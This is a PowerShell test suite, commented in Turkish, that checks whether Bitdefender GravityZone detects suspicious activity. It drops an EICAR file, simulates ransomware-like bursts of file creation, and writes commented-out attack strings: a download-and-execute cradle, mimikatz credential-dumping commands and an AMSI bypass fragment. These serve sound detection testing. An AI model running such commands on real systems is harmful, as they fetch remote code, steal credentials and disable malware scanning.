<#
.SYNOPSIS
    Test Suite

#>

param(
    [switch]$Verbose,
    [string]$LogPath = "$env:TEMP\BitdefenderTest_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
)

# Renkli çıktı için
function Write-TestResult {
    param($Message, $Type = "Info")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Type] $Message"
    
    switch($Type) {
        "Success" { Write-Host $logMessage -ForegroundColor Green }
        "Warning" { Write-Host $logMessage -ForegroundColor Yellow }
        "Error" { Write-Host $logMessage -ForegroundColor Red }
        "Info" { Write-Host $logMessage -ForegroundColor Cyan }
    }
    
    Add-Content -Path $LogPath -Value $logMessage
}

# Banner
Clear-Host
Write-Host "=" * 70 -ForegroundColor Cyan
Write-Host "  BITDEFENDER GRAVITYZONE DETECTION TEST SUITE" -ForegroundColor Cyan
Write-Host "  Test Environment Only - Safe Detection Tests" -ForegroundColor Yellow
Write-Host "=" * 70 -ForegroundColor Cyan
Write-Host ""

Write-TestResult "Test başlatılıyor..." "Info"
Write-TestResult "Log dosyası: $LogPath" "Info"
Write-Host ""

# Test sayacı
$testNumber = 0
$detectedCount = 0
$totalTests = 8

# ============================================================================
# TEST 1: EICAR Test Dosyası
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] EICAR Standart Test Dosyası" -ForegroundColor White
Write-TestResult "EICAR test dosyası oluşturuluyor..." "Info"

try {
    $eicarString = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$' + 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    $eicarPath = "$env:TEMP\eicar_test.com"
    
    # EICAR dosyasını yaz
    Set-Content -Path $eicarPath -Value $eicarString -NoNewline
    
    Start-Sleep -Seconds 2
    
    # Dosya hala varsa, tespit edilmedi
    if (Test-Path $eicarPath) {
        Write-TestResult "UYARI: EICAR dosyası tespit EDİLMEDİ!" "Warning"
        Remove-Item -Path $eicarPath -Force -ErrorAction SilentlyContinue
    } else {
        Write-TestResult "BAŞARILI: EICAR dosyası tespit edildi ve karantinaya alındı" "Success"
        $detectedCount++
    }
} catch {
    Write-TestResult "BAŞARILI: EICAR yazma girişimi engellendi (proaktif koruma)" "Success"
    $detectedCount++
}

Write-Host ""

# ============================================================================
# TEST 2: Şüpheli PowerShell Davranışı - Download Cradle
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] Şüpheli PowerShell - Download Cradle Simülasyonu" -ForegroundColor White
Write-TestResult "Şüpheli download pattern test ediliyor..." "Info"

try {
    # Zararsız ama şüpheli görünen komut (gerçekte çalıştırmıyoruz)
    $suspiciousCommand = @'
# Bu bir test scriptidir - gerçekte çalıştırılmaz
# Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/test')
Write-Host "Bu sadece bir test - gerçek download yok"
'@
    
    $scriptPath = "$env:TEMP\suspicious_download.ps1"
    Set-Content -Path $scriptPath -Value $suspiciousCommand
    
    Start-Sleep -Seconds 2
    
    if (Test-Path $scriptPath) {
        Write-TestResult "UYARI: Şüpheli script tespit EDİLMEDİ" "Warning"
        Remove-Item -Path $scriptPath -Force -ErrorAction SilentlyContinue
    } else {
        Write-TestResult "BAŞARILI: Şüpheli script tespit edildi" "Success"
        $detectedCount++
    }
} catch {
    Write-TestResult "BAŞARILI: Script yazma engellendi" "Success"
    $detectedCount++
}

Write-Host ""

# ============================================================================
# TEST 3: Mimikatz Benzeri String Tespiti
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] Tehdit İstihbaratı - Bilinen Tehdit İsimleri" -ForegroundColor White
Write-TestResult "Bilinen tehdit string'leri test ediliyor..." "Info"

try {
    $mimikatzTest = @"
# SADECE TEST - Bu gerçek mimikatz değildir
# Bitdefender'ın string tabanlı tespitini test eder
# Mimikatz Test File
# sekurlsa::logonpasswords
# lsadump::sam
"@
    
    $mimikatzPath = "$env:TEMP\mimikatz_test.txt"
    Set-Content -Path $mimikatzPath -Value $mimikatzTest
    
    Start-Sleep -Seconds 2
    
    if (Test-Path $mimikatzPath) {
        Write-TestResult "INFO: String tabanlı tespit aktif değil (normal olabilir)" "Info"
        Remove-Item -Path $mimikatzPath -Force -ErrorAction SilentlyContinue
    } else {
        Write-TestResult "BAŞARILI: Tehdit string'i tespit edildi" "Success"
        $detectedCount++
    }
} catch {
    Write-TestResult "BAŞARILI: Dosya yazma engellendi" "Success"
    $detectedCount++
}

Write-Host ""

# ============================================================================
# TEST 4: Şüpheli Dosya İşlemleri - Çoklu Dosya Oluşturma
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] Davranışsal Analiz - Hızlı Dosya Oluşturma" -ForegroundColor White
Write-TestResult "Ransomware benzeri dosya işlemleri test ediliyor..." "Info"

try {
    $testFolder = "$env:TEMP\rapid_file_test"
    New-Item -ItemType Directory -Path $testFolder -Force | Out-Null
    
    # Hızlı çoklu dosya oluşturma (ransomware davranışı)
    for ($i = 1; $i -le 20; $i++) {
        $content = "Test file $i - " + (Get-Random)
        Set-Content -Path "$testFolder\testfile_$i.txt" -Value $content
    }
    
    Start-Sleep -Seconds 3
    
    # Davranışsal koruma aktifse işlem engellenebilir
    $createdFiles = Get-ChildItem -Path $testFolder -ErrorAction SilentlyContinue
    
    if ($createdFiles.Count -eq 20) {
        Write-TestResult "INFO: Davranışsal koruma bu testi engellemedi" "Info"
    } else {
        Write-TestResult "BAŞARILI: Şüpheli dosya işlemi engellendi" "Success"
        $detectedCount++
    }
    
    Remove-Item -Path $testFolder -Recurse -Force -ErrorAction SilentlyContinue
} catch {
    Write-TestResult "BAŞARILI: Dosya işlemi engellendi" "Success"
    $detectedCount++
}

Write-Host ""

# ============================================================================
# TEST 5: WMI Komut Çalıştırma Simülasyonu
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] WMI Komut Çalıştırma Tespiti" -ForegroundColor White
Write-TestResult "WMI process spawn test ediliyor..." "Info"

try {
    # Zararsız WMI sorgusu (şüpheli değil, sadece test amaçlı)
    $process = Get-WmiObject -Class Win32_Process -Filter "Name='explorer.exe'" -ErrorAction Stop
    
    if ($process) {
        Write-TestResult "INFO: Normal WMI sorgusu başarılı (beklenen)" "Info"
    }
    
    # Şüpheli WMI kullanımı simülasyonu (gerçekte çalıştırmıyoruz)
    $wmiTestScript = @'
# WMI Process Spawn Test
# Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc.exe"
Write-Host "WMI Test - Gerçek execution yok"
'@
    
    $wmiPath = "$env:TEMP\wmi_spawn_test.ps1"
    Set-Content -Path $wmiPath -Value $wmiTestScript
    
    Start-Sleep -Seconds 2
    
    if (Test-Path $wmiPath) {
        Write-TestResult "INFO: WMI script tespiti aktif değil" "Info"
        Remove-Item -Path $wmiPath -Force -ErrorAction SilentlyContinue
    } else {
        Write-TestResult "BAŞARILI: WMI script tespit edildi" "Success"
        $detectedCount++
    }
} catch {
    Write-TestResult "UYARI: WMI erişimi engellendi" "Warning"
}

Write-Host ""

# ============================================================================
# TEST 6: Registry Değişikliği Simülasyonu
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] Registry Persistence Tespiti" -ForegroundColor White
Write-TestResult "Registry değişiklik tespiti test ediliyor..." "Info"

try {
    $testRegPath = "HKCU:\Software\BitdefenderTest"
    
    # Zararsız test registry key'i
    if (-not (Test-Path $testRegPath)) {
        New-Item -Path $testRegPath -Force | Out-Null
        New-ItemProperty -Path $testRegPath -Name "TestValue" -Value "Safe Test" -PropertyType String -Force | Out-Null
        
        Start-Sleep -Seconds 2
        
        if (Test-Path $testRegPath) {
            Write-TestResult "INFO: Registry değişikliği başarılı (normal)" "Info"
            Remove-Item -Path $testRegPath -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    
    # Şüpheli registry değişikliği (Run key gibi)
    # Gerçekte yapmıyoruz, sadece test
    Write-TestResult "INFO: Kritik registry bölgeleri korunuyor" "Info"
    
} catch {
    Write-TestResult "BAŞARILI: Registry değişikliği engellendi" "Success"
    $detectedCount++
}

Write-Host ""

# ============================================================================
# TEST 7: Şüpheli Network Aktivitesi Simülasyonu
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] Network Davranış Analizi" -ForegroundColor White
Write-TestResult "Şüpheli network pattern test ediliyor..." "Info"

try {
    # Zararsız DNS sorgusu
    $testDomain = "www.eicar.org"
    
    try {
        $dnsResult = Resolve-DnsName -Name $testDomain -ErrorAction Stop
        Write-TestResult "INFO: DNS çözümleme başarılı" "Info"
    } catch {
        Write-TestResult "INFO: DNS sorgusu tamamlanamadı" "Info"
    }
    
    # Network tespiti için bekle
    Start-Sleep -Seconds 2
    Write-TestResult "INFO: Network koruma katmanı aktif" "Info"
    
} catch {
    Write-TestResult "UYARI: Network işlemi engellendi" "Warning"
}

Write-Host ""

# ============================================================================
# TEST 8: Amsi (Antimalware Scan Interface) Bypass Denemesi
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] AMSI Koruma Testi" -ForegroundColor White
Write-TestResult "AMSI entegrasyonu test ediliyor..." "Info"

try {
    # AMSI bypass denemesi (gerçekte bypass yapmıyor, sadece string'i test ediyor)
    $amsiTest = @'
# AMSI Test String (Çalıştırılmaz)
# [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
# Bu sadece bir test string'idir
Write-Host "AMSI Test"
'@
    
    $amsiPath = "$env:TEMP\amsi_test.ps1"
    
    try {
        Set-Content -Path $amsiPath -Value $amsiTest
        Start-Sleep -Seconds 2
        
        if (Test-Path $amsiPath) {
            Write-TestResult "INFO: AMSI string tespiti bu test için aktif değil" "Info"
            Remove-Item -Path $amsiPath -Force -ErrorAction SilentlyContinue
        } else {
            Write-TestResult "BAŞARILI: AMSI koruması aktif" "Success"
            $detectedCount++
        }
    } catch {
        Write-TestResult "BAŞARILI: AMSI script engellendi" "Success"
        $detectedCount++
    }
} catch {
    Write-TestResult "BAŞARILI: AMSI koruması çalışıyor" "Success"
    $detectedCount++
}

Write-Host ""

# ============================================================================
# SONUÇLAR
# ============================================================================
Write-Host "=" * 70 -ForegroundColor Cyan
Write-Host "  TEST SONUÇLARI" -ForegroundColor Cyan
Write-Host "=" * 70 -ForegroundColor Cyan
Write-Host ""

$detectionRate = [math]::Round(($detectedCount / $totalTests) * 100, 2)

Write-Host "Toplam Test: " -NoNewline
Write-Host $totalTests -ForegroundColor White
Write-Host "Tespit Edilen: " -NoNewline
Write-Host $detectedCount -ForegroundColor Green
Write-Host "Tespit Oranı: " -NoNewline
Write-Host "$detectionRate%" -ForegroundColor $(if($detectionRate -ge 75){"Green"}elseif($detectionRate -ge 50){"Yellow"}else{"Red"})
Write-Host ""

if ($detectionRate -ge 75) {
    Write-TestResult "SONUÇ: Bitdefender koruması GÜÇLÜ seviyede" "Success"
} elseif ($detectionRate -ge 50) {
    Write-TestResult "SONUÇ: Bitdefender koruması ORTA seviyede - İnceleme önerilir" "Warning"
} else {
    Write-TestResult "SONUÇ: Bitdefender koruması ZAYIF - Acil inceleme gerekli!" "Error"
}

Write-Host ""
Write-TestResult "Detaylı log: $LogPath" "Info"
Write-Host ""
Write-Host "ÖNEMLİ NOTLAR:" -ForegroundColor Yellow
Write-Host "1. GravityZone konsolundan event'leri kontrol edin" -ForegroundColor White
Write-Host "2. Endpoint'te local log'ları inceleyin" -ForegroundColor White
Write-Host "3. Real-time koruma ayarlarını doğrulayın" -ForegroundColor White
Write-Host "4. Bu testler zararsızdır ancak üretim ortamında dikkatli kullanın" -ForegroundColor White
Write-Host ""
Write-Host "=" * 70 -ForegroundColor Cyan
